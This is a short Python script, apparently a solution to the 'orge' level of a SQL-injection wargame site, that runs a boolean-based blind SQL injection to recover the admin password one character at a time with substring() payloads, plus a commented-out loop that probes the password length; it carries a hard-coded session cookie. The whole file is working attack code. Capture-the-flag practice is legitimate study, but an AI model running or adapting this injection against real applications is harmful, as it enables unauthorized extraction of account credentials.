import urllib.parse as urllib
import urllib.request as urllib2
import sys
import time
 
string = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$^&*()-_+="
key = ""
 
for i in range(1, 9):
    for j in range(len(string)):
        payload = f"%26%26(substring(pw," + str(i) + ",1)='" + string[j] + "')%23"
        url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=haha'%7C%7Cid='admin'"+payload

        opener = urllib2.build_opener(urllib2.HTTPHandler)
        request = urllib2.Request(url)
        request.add_header('Cookie', 'PHPSESSID=nmk68iafdmus1nkvs9mekkaj4m')
        request.get_method = lambda:'POST'
        data = opener.open(request)
        data = data.read()

        if bytes("Hello admin", 'utf-8') in data:
            key += string[j]
            break
        else:
            print("Testing with i, j: ", i, j)
        
        time.sleep(0.2)

    print("key: ", key)
 
print(key)

# for i in range(1, 30):
#     payload = f"pw=1'%7C%7Cid='admin'%26%26length(pw)=" + str(i) + "%23"
#     url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?"+payload

#     opener = urllib2.build_opener(urllib2.HTTPHandler)
#     request = urllib2.Request(url)
#     request.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36')
#     request.add_header('Cookie', 'PHPSESSID=nmk68iafdmus1nkvs9mekkaj4m')
#     request.get_method = lambda:'POST'
#     data = opener.open(request)
#     data = data.read()

#     if bytes("Hello admin", 'utf-8') in data:
#         print("len: ", i)
#         # break
#     else: 
#         print("check with url = ", url)

#     time.sleep(0.2)

 